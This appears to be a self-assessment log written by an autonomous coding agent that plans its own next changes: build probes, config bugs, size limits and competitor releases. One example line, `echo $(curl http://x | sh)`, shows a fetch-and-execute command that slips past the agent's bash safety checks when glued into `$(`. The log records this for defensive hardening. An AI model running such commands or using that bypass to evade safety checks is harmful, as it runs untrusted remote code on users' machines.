# Assessment — Day 259 (20:29)

## Build Status
Pass — verified by the harness at session start (HEAD f2f30215). Binary `target/debug/yoyo` built 20:29, `yoyo v0.4.0 (f2f30215 2026-11-14)`.
Probes: `-p "Reply with just the word: pong"` → `pong` (anthropic / claude-opus-5-5). `config show` and `config get thinking` work.
**Confirmed live on the built binary: #1194** — `yoyo config show` prints `max_tokens = ***`, and even `yoyo config get max_tokens` (asking for that one key by name) prints `max_tokens = ***  (.yoyo.toml)`.

**Size-gate hazards the planner must price before touching these files** (from trajectory + tests/module_size.rs):
- `src/context.rs` 2035 lines, UNLISTED, cap 2000 + 50 grace → **15 more lines makes `cargo test` fatal** (whole-task revert).
- `src/format/mod.rs` 2874 vs registered 2788 (+86 drift; grace 100) → **14 more lines is fatal**.
Any task editing either file must either split it or paste the new size into GRANDFATHERED_OVERSIZED_MODULES in the same diff.

## Recent Changes (last 3 sessions)
- **Day 259 11:16** — de85ac91 *Part of #1184*: top-level config map now built from the parsed `toml::Table`; a key under any `[section]` no longer overrides model/provider/base_url. c157098b *Fixes #1172*: `config get` consults each key's real run reader, so `model = ""` reads "not set, using default" in both places. Filed #1194 (max_tokens masked) and #1195 (config get/show print file text where the run uses a different value: thinking ""/unknown → medium; temperature 5 → 1.0).
- **Day 259 02:03** — *Fixes #1191*: GIT_DIR=/GIT_WORK_TREE= glued to `$(`, `(`, backtick now refused. Census filed as **#1193**: 18 of 33 SAFETY_CHECKS miss their trigger when glued into `$(`/`(`/backtick. *Fixes #1182*: `[mcp_servers]`/`[model_pricing]` read via the toml crate (but config_unknown_keys.rs grew 1403→1623 — lesson d259 says this slice grew the hand parser it is meant to delete).
- **Day 258** — *Fixes #1192* (/read and /plan refuse rm/rmdir etc.), *#1190* (--help max_tokens text), *#1189* ($(...) inside double quotes no longer blanked by strip_quoted_regions), *#1185* (config rungs compared by file identity), #1187 (owner-diagnosed dead loop test).
- After 11:16: only skill-evolve (NO-OP, 10th consecutive saturation) and synthesize commits.

## Source Architecture
~237k lines total under src/ (includes *_tests.rs). Largest: cli.rs 7873, commands_risk.rs 6645, tool_wrappers.rs 5762, tools.rs 5286, agent_builder.rs 5009, safety.rs 4799, commands_search.rs 4780, config.rs 4683, commands_spawn.rs 4566, watch.rs 4444, prompt.rs 3987, commands_git.rs 3923, symbols.rs 3804.
Entry: main.rs → cli.rs `parse_args_with_config` → dispatch_sub.rs (shell verbs) / repl / prompt mode; agent built in agent_builder.rs; tools in tools.rs + tool_wrappers.rs; bash safety in safety.rs (`analyze_bash_command`, `SAFETY_CHECKS`); config in config.rs + config_toml_read.rs + config_unknown_keys.rs + config_value.rs + config_syntax.rs + config_paths.rs.
Config hand-line-reading still present: `.lines()` loops in config.rs (5), config_unknown_keys.rs (2), config_value.rs (2), config_syntax.rs (1). Per #1184's latest scope comment, still open = `[permissions]`/`[directories]` arrays (security fences, hand line reader), toml_edit for writes, delete the hand parser.

## Self-Test Results
- `-p` round trip: works, auto-watch notes "no files changed this turn — skipping".
- `config show`: masks `max_tokens` (#1194, confirmed). Of the TOP_LEVEL_KEYS, only `api_key` and `max_tokens` match `is_secret_key`'s substrings (key/token/secret/password) — so `max_tokens` is the only false positive among real top-level keys. `is_secret_key` (commands_config.rs:360) is substring-based; callers: commands_config.rs, commands_config_get.rs, commands.rs tests.
- No breakage found in the short probes.

## Evolution History (last 5 runs)
evolve.yml: 4 of 4 completed runs success (11-13 15:43, 21:46; 11-14 01:57, 11:10); current run (20:22) in progress. Trajectory: last 10 sessions all 2/2 tasks, 0 reverts in 14 days. CI failures in window are ~1d old (clippy `if` guard returning bool literal; exit 101), CI green since. Provider health clean.
Pattern: **config took 5 of last 9 self-driven diffs** — trajectory says send the self-driven slot elsewhere. Owner-filed #1184 is not self-driven, so one #1184 slice is still legitimate; the second slot should leave config.

## Capability Gaps
- **Competitor bash-layer hardening continues** (Claude Code 2.1.325, 2026-11-13): "a gap in Bash permission checks where some compound commands could run without asking" and "a Bash allow rule could run a different program than the one it names". yoyo's live analogue is #1193 (18/33 checks blind to glued `$(`/`(`/backtick) — the most concrete security gap I hold.
- **Headless trust** (Codex 0.169, 2026-11-13): `codex exec` keeps project config + MCP off in untrusted dirs; `--trust` saves trust. yoyo already gates project MCP/permissions/hooks/notify/skills/base_url on trust (cli.rs `gate_project_*`, `gate_mcp_sources`) — convergence, not a gap. Neither rival re-prompts on a trusted project's *content* change, which is yoyo's #1188.
- Unverified candidates from 2.1.325 (NOT probed on yoyo — would need a probe before becoming tasks): subagent cut off at the output-token limit returning only its tail (CC now re-asks for a brief whole answer); shell commands run after the working directory was deleted.
Broad: no TUI (#215 parked), no benchmark submission (#156), MCP stdio-only, no restart of dead MCP servers (#1134). CLAUDE_CODE_GAP.md header is 185 days stale — its rows are not trustworthy without re-reading.

## Bugs / Friction Found
1. **#1193 (safety, live, security)** — 18 of 33 SAFETY_CHECKS miss triggers glued into `$(`, `(`, backtick (e.g. `echo $(curl http://x | sh)` passes check_pipe_from_internet). Two mechanisms read from code: (A) `is_at_word_boundary`/`_end` don't treat backtick as a boundary (9 backtick-only rows); (B) glued `$(`/`(` cases; plus `check_indirect_command_word` nested case not fixed by spacing. Not in the config zone; strong candidate for the self-driven slot. Lesson d258/d259: fix via the shared boundary helper, re-run the full 33-check census in the same task, report N of M.
2. **#1194 (config, trivial)** — `max_tokens` masked as secret. Fix shape: exact secret-key predicate (or exclude max_tokens/known numeric keys) with a test across TOP_LEVEL_KEYS. Note d259 lesson: test against the authority list, not just the one key.
3. **#1195 (config)** — config get/show print file text where run resolves to another value. d259 lesson: the consult should return the run's resolved value, not an Option<bool>.
4. **#1184 (owner, config)** — next slice: move `[permissions]`/`[directories]` (security fences) off the hand line reader onto the parsed Table. Report the done-when metric (count of `.lines()` walkers / hand-reader lines) before and after, per d259 lesson.
5. **#1188 (trust)** — trusted project's later `.yoyo.toml` change (base_url) honoured silently. Read-only evidence; needs an owner either/or.
6. Size-gate hazards on context.rs / format/mod.rs (above).

## Open Issues Summary
Owner/agent-input: #1184 (TOML via toml crate — in progress, 3 slices done), #1122 (yoagent upgrade + reuse plugins), #991 (retry_safe_events for non-TTY -p).
Agent-self live: #1195, #1194, #1193, #1188, #1186 (claude-fable-5-2 priced as Fable 5; upstream), #1173 (Bedrock thinking without maxTokens, unchecked), #1147 (29 of 78 known ids have no outside authority), #1134, #1121, #1102, #1100, #1094, #1064, #1012.
Parked: #1070, #1060, #1040, #1018, #1014, #854, #341, #215, #156.

## Research Findings
- Recall (yopedia, agent scope): Claude Code 2.1.317–2.1.325 and Codex 0.165–0.169 were already scanned into notes (`bash-permission-layer`, `changelog-delta-analysis`, `cli-coding-agent-permission-models`); the 2.1.325 scan is described there as a 9-item work queue. The `/api/query` endpoint refused my token ("Sign in required"), so I could only read search snippets, not the queue's contents.
- New today: Codex 0.168/0.169 (Nov 13): exec trust (above), model-provider picker, side-chat tabs, OSC 777 notifications. Ingested to yopedia as "Codex CLI 0.168/0.169 trust convergence vs yoyo".
- Both rivals' November releases concentrate on trust/permission boundaries and bash-parser bypasses — the same zone as my #1193/#1188. Biggest product-visible gap remains UX (no TUI #215, no provider picker), but nothing there is cheaply sliceable this session.

## Planner notes (suggested shape, not tasks)
- Self-driven slot should leave `config` (5/9). Strongest non-config candidate: **#1193** (safety.rs). Per #1193's mechanisms, the shared fix is in the word-boundary helpers (`is_at_word_boundary`/`_end` treat backtick and `$(`/`(` as boundaries), then re-run the full SAFETY_CHECKS census (35 members, 33 token-anchored) in the same task and report N of 33. safety.rs is 4799 lines — check its module_size entry before adding.
- Issue/owner slot: **#1184** next slice = `[permissions]`/`[directories]` arrays onto the parsed `toml::Table` (these are security fences). Report the done-when metric (hand-reader `.lines()` walkers / lines) before and after (d259 lesson), and don't grow config_unknown_keys.rs to bridge.
- **#1194** is a 1–3 line fix (exact match for secret-key names, or exempt max_tokens) with a test over TOP_LEVEL_KEYS; cheap enough to fold into a config task but it is config-zone.
